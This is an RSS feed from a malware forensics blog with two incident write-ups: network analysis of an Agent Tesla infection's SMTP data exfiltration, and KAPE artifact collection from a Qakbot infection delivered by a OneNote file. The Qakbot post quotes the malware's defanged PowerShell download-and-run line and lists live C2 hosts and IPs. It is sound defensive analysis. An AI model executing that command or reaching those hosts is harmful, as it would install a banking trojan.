<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Forensic Analysis - malwr0nwind0z</title>
	<atom:link href="/blog/category/forensic-analysis/feed/" rel="self" type="application/rss+xml" />
	<link>/blog/</link>
	<description></description>
	<lastBuildDate>Mon, 29 Jan 2024 17:17:14 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.4.3</generator>

<image>
	<url>/blog/wp-content/uploads/2023/03/cropped-android-chrome-512x512-1-32x32.png</url>
	<title>Forensic Analysis - malwr0nwind0z</title>
	<link>/blog/</link>
	<width>32</width>
	<height>32</height>
</image> 
	<item>
		<title>Network Forensics with Wireshark and Brim: Analyzing a PCAP from an Agent Tesla infection</title>
		<link>/blog/post_7-25-23_network_forensics_agent_tesla/?utm_source=rss#038;utm_medium=rss&#038;utm_campaign=post_7-25-23_network_forensics_agent_tesla</link>
					<comments>/blog/post_7-25-23_network_forensics_agent_tesla/#respond</comments>
		
		<dc:creator><![CDATA[malwr0nwind0z]]></dc:creator>
		<pubDate>Wed, 26 Jul 2023 00:34:40 +0000</pubDate>
				<category><![CDATA[Forensic Analysis]]></category>
		<category><![CDATA[Agent Tesla]]></category>
		<category><![CDATA[Brim]]></category>
		<category><![CDATA[Data Exfil]]></category>
		<category><![CDATA[dead-box forensics]]></category>
		<category><![CDATA[forensics]]></category>
		<category><![CDATA[malspam]]></category>
		<category><![CDATA[malware]]></category>
		<category><![CDATA[malwr0nwind0z]]></category>
		<category><![CDATA[pcap]]></category>
		<category><![CDATA[remote access trojan]]></category>
		<category><![CDATA[SMTP]]></category>
		<category><![CDATA[SMTP Data Exfiltration]]></category>
		<category><![CDATA[Suricata]]></category>
		<category><![CDATA[Wireshark]]></category>
		<guid isPermaLink="false">/blog/?p=1165</guid>

					<description><![CDATA[<p>Simplifying Network Forensic Analysis: Exploring Wireshark PCAP Files with Brim Wireshark is a powerful network protocol analyzer that allows network administrators and security professionals to monitor and inspect network traffic. It captures packets in real-time or reads from existing capture files, known as PCAP files, for offline analysis. However, as the complexity of network data [&#8230;]</p>
<p>The post <a href="/blog/post_7-25-23_network_forensics_agent_tesla/">Network Forensics with Wireshark and Brim: Analyzing a PCAP from an Agent Tesla infection</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></description>
										<content:encoded><![CDATA[<figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
<div class="ast-oembed-container " style="height: 100%;"><iframe title="Network Forensics with Wireshark and Brim(Zui): Analyzing a PCAP from an Agent Tesla infection" width="1240" height="698" src="https://www.youtube.com/embed/EzwD3aUbnzg?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe></div>
</div><figcaption class="wp-element-caption"><strong>Video 1: Watch the companion video that this blog post inspired.</strong></figcaption></figure>


<p><img fetchpriority="high" decoding="async" width="623" height="155" class="wp-image-1169" src="/blog/wp-content/uploads/2023/07/a-close-up-of-a-logo-description-automatically-ge.jpeg" alt="A close up of a logo

Description automatically generated" srcset="/blog/wp-content/uploads/2023/07/a-close-up-of-a-logo-description-automatically-ge.jpeg 623w, /blog/wp-content/uploads/2023/07/a-close-up-of-a-logo-description-automatically-ge-300x75.jpeg 300w" sizes="(max-width: 623px) 100vw, 623px" /></p>
<h4>Simplifying Network Forensic Analysis: Exploring Wireshark PCAP Files with Brim</h4>
<p>Wireshark is a powerful network protocol analyzer that allows network administrators and security professionals to monitor and inspect network traffic. It captures packets in real-time or reads from existing capture files, known as PCAP files, for offline analysis. However, as the complexity of network data increases, analyzing PCAP files can become cumbersome. In this blog post, we&#8217;ll introduce Brim, a modern and intuitive tool that simplifies the process of viewing and analyzing Wireshark PCAP files, making network analysis more efficient and insightful.</p>
<p><strong>Understanding PCAP Files</strong></p>
<p>A PCAP (Packet Capture) file is a data file that contains captured network packets in a standardized format. Wireshark generates these files when capturing live traffic or when reading from previously recorded sessions. PCAP files store packet information, including source and destination IP addresses, ports, protocols, timestamps, and more. These files are invaluable for diagnosing network issues, detecting anomalies, and investigating security incidents.</p>
<p><strong>Introducing Brim</strong></p>
<p>Brim is a state-of-the-art network analysis tool designed to help users make sense of vast amounts of network data, including Wireshark PCAP files. It provides an elegant and user-friendly interface that simplifies the process of exploring complex network datasets. Brim&#8217;s unique approach combines speed, scalability, and advanced search capabilities, making it an excellent choice for both novices and experienced analysts.</p>
<p><strong>Key Features of Brim:</strong></p>
<p>Intuitive Interface: Brim&#8217;s interface is designed with the user in mind. The clean and modern layout allows for easy navigation and efficient analysis, eliminating the steep learning curve associated with many network analysis tools.</p>
<p>High Performance: Brim leverages cutting-edge technologies to handle large PCAP files with lightning-fast speed. Analyzing massive datasets is no longer a time-consuming task.</p>
<p>Timeline View: Brim offers a timeline view that allows users to visualize network events over time. This feature helps in identifying patterns, understanding traffic trends, and spotting irregularities.</p>
<p>Dynamic Filtering: Brim&#8217;s filtering capabilities are second to none. Users can quickly narrow down their searches using various criteria, such as IP addresses, ports, protocols, and timestamps.</p>
<p>Advanced Query Language: Brim incorporates an expressive query language that enables users to create complex searches and analyze data with precision.</p>
<p>Later, we will run Wireshark to collect network traffic in a Sandbox (Windows 10) Lab machine with the goal of analyzing any network connections made from a known Agent Tesla sample.</p>
<p><strong>Agent Tesla: The RAT</strong></p>
<p>Agent Tesla&#8221; is known as a type of Remote Access Trojan (RAT). A RAT is a malicious software program used by cybercriminals to gain unauthorized access and control over a victim&#8217;s computer remotely. Once installed on a target system, a RAT allows the attacker to perform various malicious activities, such as stealing sensitive information, logging keystrokes, capturing screenshots, accessing files, and even controlling the victim&#8217;s computer. The RAT&#8217;s primary purpose is to gather and exfiltrate valuable information from infected systems, which can then be used for various malicious purposes, such as identity theft, financial fraud, or selling the stolen data on the dark web.</p>
<p><strong>How This Agent Tesla malware is delivered</strong></p>
<p>Agent Tesla is typically delivered to the victim through various methods, including phishing emails, malspam, and exploit kits. The exact method of delivery may vary depending on the attackers&#8217; goals.</p>
<p>In this instance, one of my customers received this malware through malspam; which contained a malicious .exe file (Agent Tesla) within a tar.gz archive named TT remittance against outstanding invoice.tar.gz. The malicious executable file (TT remittance against outstanding invoice.exe), that once clicked, it runs and executes.</p>
<p><img decoding="async" width="1013" height="285" class="wp-image-1170" src="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica.jpeg" alt="A screenshot of a computer

Description automatically generated" srcset="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica.jpeg 1013w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-300x84.jpeg 300w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-768x216.jpeg 768w" sizes="(max-width: 1013px) 100vw, 1013px" /> <strong>Figure 1: Malspam which contained a malicious .exe file (Agent Tesla) within a tar.gz archive named TT remittance against outstanding invoice.tar.gz</strong></p>
<p><strong>Agent Tesla – Data Exfiltration over SMTP</strong></p>
<p>I reviewed the post infection traffic from this malware using Wireshark and Brim. The review of the Wireshark capture reveals a DNS request for smtp.marintravellft.com. This was the start data exfiltration over SMTP.</p>
<p><img decoding="async" width="1893" height="43" class="wp-image-1171" src="/blog/wp-content/uploads/2023/07/word-image-1165-3.png" srcset="/blog/wp-content/uploads/2023/07/word-image-1165-3.png 1893w, /blog/wp-content/uploads/2023/07/word-image-1165-3-300x7.png 300w, /blog/wp-content/uploads/2023/07/word-image-1165-3-1024x23.png 1024w, /blog/wp-content/uploads/2023/07/word-image-1165-3-768x17.png 768w, /blog/wp-content/uploads/2023/07/word-image-1165-3-1536x35.png 1536w" sizes="(max-width: 1893px) 100vw, 1893px" /><strong>Figure 2: Wireshark capture of C2 traffic show a DNS request to smtp.marintravellft.com.</strong></p>
<p>Next, I seen successful authentication to a compromised email address (schayer@marintravellft.com). The body of the email shows that customer data is being exfiltrated, which includes the hostname, ip address, and username of the infected host machine.</p>
<p><img loading="lazy" decoding="async" width="1920" height="652" class="wp-image-1172" src="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica.png" alt="A screenshot of a computer

Description automatically generated" srcset="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica.png 1920w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-300x102.png 300w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1024x348.png 1024w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-768x261.png 768w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1536x522.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" /><strong>Figure 3: Wireshark capture of C2 Traffic showing a successful connection over SMTP.</strong></p>
<p>.</p>
<p><img loading="lazy" decoding="async" width="1280" height="909" class="wp-image-1173" src="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1.png" alt="A screenshot of a computer

Description automatically generated" srcset="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1.png 1280w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1-300x213.png 300w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1-1024x727.png 1024w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-1-768x545.png 768w" sizes="(max-width: 1280px) 100vw, 1280px" /><strong>Figure 4: Wireshark capture of C2 traffic showing customer data being sent to a compromised email address (schayer@marintravellft.com).</strong></p>
<p><strong>Agent Tesla – Exfiltration detected by Brim’s Suricata</strong></p>
<p>Lastly, I loaded the Wireshark PCAP file into Brim. Brim’s Suricata signatures were able to detect and alert on the C2 connection to IP 208.91.199.224:587, which is the data exfiltration over SMTP.</p>
<p><img loading="lazy" decoding="async" width="1918" height="1031" class="wp-image-1174" src="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-2.png" alt="A screenshot of a computer

Description automatically generated" srcset="/blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-2.png 1918w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-2-300x161.png 300w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-2-1024x550.png 1024w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-2-768x413.png 768w, /blog/wp-content/uploads/2023/07/a-screenshot-of-a-computer-description-automatica-2-1536x826.png 1536w" sizes="(max-width: 1918px) 100vw, 1918px" /><strong>Figure 5: Brim’s Suricata engine detects the data exfiltration over SMTP.</strong></p>
<p>That ends this blog, where we used Wireshark and Brim to collect and analyze network traffic from stage 1 of this Agent Tesla infection.</p>
<p><strong>IOCs:</strong></p>
<p>TT remittance against outstanding invoice.tar.gz (MD5: 3f2deec2e3e8871ec4d0e2c68fc81804)</p>
<p>TT remittance against outstanding invoice.exe (MD5: e636239783988acde754d1555dcd1986)</p>
<p><strong>C2 IOCs:</strong></p>
<p>smtp.marintravellft.com</p>
<p>us2.smtp.mailhostbox.com</p>
<p>208.91.199.224:587</p><p>The post <a href="/blog/post_7-25-23_network_forensics_agent_tesla/">Network Forensics with Wireshark and Brim: Analyzing a PCAP from an Agent Tesla infection</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></content:encoded>
					
					<wfw:commentRss>/blog/post_7-25-23_network_forensics_agent_tesla/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>KAPE Collection: Forensic artifacts from a Qakbot infection (via Qaknote)</title>
		<link>/blog/post_3-12-23_kape_forensics_qakbot_qaknote/?utm_source=rss#038;utm_medium=rss&#038;utm_campaign=post_3-12-23_kape_forensics_qakbot_qaknote</link>
					<comments>/blog/post_3-12-23_kape_forensics_qakbot_qaknote/#respond</comments>
		
		<dc:creator><![CDATA[malwr0nwind0z]]></dc:creator>
		<pubDate>Sun, 12 Mar 2023 16:34:38 +0000</pubDate>
				<category><![CDATA[Forensic Analysis]]></category>
		<category><![CDATA[banking trojan]]></category>
		<category><![CDATA[dead-box forensics]]></category>
		<category><![CDATA[forensics]]></category>
		<category><![CDATA[KAPE]]></category>
		<category><![CDATA[Kroll Artifact Parser And Extractor]]></category>
		<category><![CDATA[malware]]></category>
		<category><![CDATA[malwr0nwind0z]]></category>
		<category><![CDATA[onenote]]></category>
		<category><![CDATA[Qakbot]]></category>
		<category><![CDATA[Qaknote]]></category>
		<guid isPermaLink="false">/blog/?p=1097</guid>

					<description><![CDATA[<p>KAPE: Kroll Artifact Parser and Extractor KAPE is a open source Windows-based triage program that will find and collect important forensically relevant Windows OS artifacts (System logs, Registry entries, etc.). KAPE can be ran on a live Windows operating or a mounted Windows image (i.e. dead-box forensics). KAPE utilizes Targets and Modules to collect and [&#8230;]</p>
<p>The post <a href="/blog/post_3-12-23_kape_forensics_qakbot_qaknote/">KAPE Collection: Forensic artifacts from a Qakbot infection (via Qaknote)</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></description>
										<content:encoded><![CDATA[<figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
<div class="ast-oembed-container " style="height: 100%;"><iframe title="Using KAPE to analyze a Qakbot infection" width="1240" height="698" src="https://www.youtube.com/embed/JzVcgZ-tzy0?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe></div>
</div><figcaption class="wp-element-caption"><strong>Video 1: Watch the companion video that this blog post inspired.</strong></figcaption></figure>


<p><style>/*! elementor - v3.19.0 - 29-01-2024 */<br />
.elementor-column .elementor-spacer-inner{height:var(--spacer-size)}.e-con{--container-widget-width:100%}.e-con-inner>.elementor-widget-spacer,.e-con>.elementor-widget-spacer{width:var(--container-widget-width,var(--spacer-size));--align-self:var(--container-widget-align-self,initial);--flex-shrink:0}.e-con-inner>.elementor-widget-spacer>.elementor-widget-container,.e-con>.elementor-widget-spacer>.elementor-widget-container{height:100%;width:100%}.e-con-inner>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer,.e-con>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer{height:100%}.e-con-inner>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer>.elementor-spacer-inner,.e-con>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer>.elementor-spacer-inner{height:var(--container-widget-height,var(--spacer-size))}.e-con-inner>.elementor-widget-spacer.elementor-widget-empty,.e-con>.elementor-widget-spacer.elementor-widget-empty{position:relative;min-height:22px;min-width:22px}.e-con-inner>.elementor-widget-spacer.elementor-widget-empty .elementor-widget-empty-icon,.e-con>.elementor-widget-spacer.elementor-widget-empty .elementor-widget-empty-icon{position:absolute;top:0;bottom:0;left:0;right:0;margin:auto;padding:0;width:22px;height:22px}</style></p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/03/icon-description-automatically-generated.png" alt="Icon Description automatically generated" /></p>
<p><strong>KAPE: Kroll Artifact Parser and Extractor</strong></p>
<p>KAPE is a open source Windows-based triage program that will find and collect important forensically relevant Windows OS artifacts (System logs, Registry entries, etc.). KAPE can be ran on a live Windows operating or a mounted Windows image (i.e. dead-box forensics). KAPE utilizes Targets and Modules to collect and triage forensic artifacts.</p>
<p><strong>How KAPE Works</strong></p>
<p>KAPE utilizes Targets and Modules to collect and triage forensic artifacts. The concepts of Targets and Modules allow this tool to do its work:</p>
<p>Targets: the type of artifacts (files, logs, or registry hives) that you can collect and store in a container (i.e. vhdx, zip).</p>
<p>Modules: scripts that utilize third-party programs/parsers to process and export (i.e. .csv, zip) the artifacts.</p>
<p>Below, we run KAPE to collect forensic artifacts on a Windows 10 machine suspected of being infected with Qakbot. The KAPE collection is being saved to an external HDD (D:).</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/03/word-image-1097-2.png" /> <br /><strong>Figure 1: KAPE ran from an external drive.</strong></p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/03/text-description-automatically-generated.png" alt="Text Description automatically generated" /><br /><strong>Figure 2: KAPE collection is done.</strong></p>
<p>The target forensic artifacts (files, logs, or registry hives) that I collect are stored in a vhdx container where I can later mount and analyze.</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/03/word-image-1097-4.jpeg" /></p>
<p><strong>Figure 3: Target forensic artifacts stored in a xhdx file.</strong></p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-email.jpeg" alt="Graphical user interface, text, application, email Description automatically generated" /><strong>Figure 4: The xhdx file is mounted for analysis.</strong></p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-table-exce.jpeg" alt="Graphical user interface, application, table, Excel Description automatically generated" /><strong>Figure 5: The CopyLog of all of the files that were collected in the xhdx file.</strong></p>
<p><strong>Qakbot: A Banking Trojan</strong></p>
<p>Qakbot is a malicious Banking Trojan that has been actively used in cyberattacks since 2009. This malware is designed to compromise the security of a target system and allow remote attackers to gain unauthorized access and control. Once it infects a computer, it then steals sensitive information such as banking credentials, personal information, and email passwords.</p>
<p><strong>How This Qakbot Infection Started</strong></p>
<p>Qakbot is typically delivered to the victim through various methods, including phishing emails, malspam, exploit kits, and exploiting vulnerabilities in software. The exact method of delivery may vary depending on the attackers&#8217; goals.</p>
<p>In this instance, our digital forensic artifacts confirm that it was delivered through malspam; that contained a malicious Microsoft OneNote document (Qaknote) within a zip archive named Invoice #030223.zip. The malicious OneNote document (Invoice #030223.one) contained a social engineering Microsoft O365 themed image (double click “open”), that once clicked, it executes an embedded WScript file (O P E N .wsf).</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description.png" alt="Graphical user interface, application Description automatically generated" /> <br /><strong>Figure 6: Embedded social engineering Microsoft O365 themed image (double click “open”)in the OneNote document (Invoice #030223.one).</strong></p>
<p><strong>Qakbot &#8211; Forensic Artifacts</strong></p>
<p>The review of the user’s Recent folder shows a lnk file for O P E N .wsf, indicating that it was double clicked and executed. Microsoft Protection (MPLog) was able to log the execution of this WScript file (O P E N .wsf) as having PID:7636 and the process start time: 133225496244686642 (LDAP/FILETIME) which converts to Sunday, March 5, 2023 11:13:44 PM GMT-05:00.</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/03/word-image-1097-8.jpeg" /><strong>Figure 7: Lnk file (located in Recent folder) pointing to the WScript file (O P E N .wsf) that the user executed.</strong></p>
<p><strong><img loading="lazy" decoding="async" src="/blog/wp-content/uploads/2023/03/Windows_Defender_log_pid_start_wsf.jpg" alt="" width="440" height="18" /> </strong></p>
<p><strong>Figure 8: Microsoft Protection logging the PID and execution time of the WScript file (O P E N .wsf).</strong></p>
<p>The WScript file invokes PowerShell to download a malicious Qakbot .dll from the following URL:</p>
<p>Download URL: http://143.198.63[.]241/MCv/020 -O $env:TEMP; rundll32 $env:TEMP\dysphemistic.dll,RS32;</p>
<p>Drop folder location: C:Users&lt;Username&gt;AppDataLocalTempdysphemistic.dll (Classification: Qakbot .dll)</p>
<p>This PowerShell activity was decoded and logged in the Microsoft-Windows-PowerShell%4Operational Event logs (Note: this logging is disabled by default).</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/03/table-description-automatically-generated.jpeg" alt="Table Description automatically generated" /><strong>Figure 9: PowerShell Event log showing the download of dysphemistic.dll.</strong></p>
<p>Microsoft Protection (MPLog) Telemetry was able to log the execution of dysphemistic.dll.</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-text-application-descr.jpeg" alt="Graphical user interface, text, application Description automatically generated" /><strong>Figure 10: Microsoft Protection logging the execution of dysphemistic.dll.</strong></p>
<p>Last but not least, we had to perform some Registry Forensics, due to having encoded PowerShell stores in HKCUSOFTWARE subkeys ‘Meteors’ &amp; ‘disprofitablePlanographically’.</p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-1.png" alt="Graphical user interface, application Description automatically generated" /><strong>Figure 11: Encoded PowerShell stored in HKCUSOFTWAREMeteors.</strong></p>
<p><img decoding="async" src="/blog/wp-content/uploads/2023/03/graphical-user-interface-application-description-2.png" alt="Graphical user interface, application Description automatically generated" /><strong>Figure 12: Encoded PowerShell stored in HKCUSOFTWARE<a id="post-1097-_Hlk129460078"></a>disprofitablePlanographically.</strong></p>
<p>That ends this blog, where we used KAPE to collect and analyzed forensic artifacts from stage 1 of this Qakbot infection.</p>
<p><strong>IOCs:</strong></p>
<p>Invoice #030223.zip (MD5: abc43976c90a3bfef20f08f3632e7c22)</p>
<p>Invoice #030223.one (MD5: 5E0085D44B2CD845CC8A964DAB23027A)</p>
<p>O P E N .wsf (MD5: 56E1C721F50A8AAE1FBAF1459A1208E2)</p>
<p>dysphemistic.dll (MD5: 0AB80C49FDEA4229C022F43F5357E64B)</p>
<p><strong>C2 IOC:</strong></p>
<p>http://143.198.63[.]241/MCv/020</p><p>The post <a href="/blog/post_3-12-23_kape_forensics_qakbot_qaknote/">KAPE Collection: Forensic artifacts from a Qakbot infection (via Qaknote)</a> first appeared on <a href="/blog/">malwr0nwind0z</a>.</p>]]></content:encoded>
					
					<wfw:commentRss>/blog/post_3-12-23_kape_forensics_qakbot_qaknote/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
